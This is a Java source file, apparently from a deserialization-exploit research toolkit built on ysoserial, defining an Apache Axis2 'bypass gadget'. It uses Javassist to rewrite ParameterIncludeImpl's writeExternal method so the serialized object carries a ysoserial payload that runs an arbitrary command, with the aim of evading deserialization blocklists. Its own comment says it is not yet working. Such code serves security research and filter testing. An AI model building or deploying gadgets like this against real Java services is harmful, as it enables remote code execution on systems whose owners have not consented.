package serialkiller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.axis2.description.ParameterIncludeImpl;
import ysoserial.payloads.annotation.Dependencies;

import java.lang.reflect.Constructor;

/**
 * Created by alvaro on 08/04/16.
 */

/*
    TODO:
        Still not working, but should be easy te get it working with more time. we have another Axis2 gadget though
 */

@Dependencies({ "org.apache.axis2:axis2-kernel:1.4" })
public class ApacheAxis2 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("org.apache.axis2.description.ParameterIncludeImpl");
        CtClass objectOutputClass = pool.get("java.io.ObjectOutput");

        CtMethod writeExternalOrig = c.getDeclaredMethod("writeExternal");
        writeExternalOrig.setName("writeExternalDisabled");

        CtMethod writeExternalNew = new CtMethod(CtClass.voidType, "writeExternal", new CtClass[] {objectOutputClass}, c);
        String code = "{" +
                "java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();" +
                "java.io.ObjectOutputStream objOut = new java.io.ObjectOutputStream(bytesOut);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "org.apache.axis2.context.externalize.SafeObjectOutputStream out = org.apache.axis2.context.externalize.SafeObjectOutputStream.install($1);" +
                "out.writeLong(8153736719090126891L);" +
                "out.writeInt(2);" +
                "out.writeBoolean(true);" +
                "out.writeBoolean(true);" +
                "out.writeBoolean(true);" +
                "out.writeObject(payload);" +
                "out.writeObject(null);" +
                "}";
        writeExternalNew.setBody(code);
        c.addMethod(writeExternalNew);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getConstructor();
        ParameterIncludeImpl parameterInclude = (ParameterIncludeImpl) ctor.newInstance();


        return parameterInclude;
    }

    public boolean bypassXStream() { return false; }
    public boolean skipTest() { return true; }

}
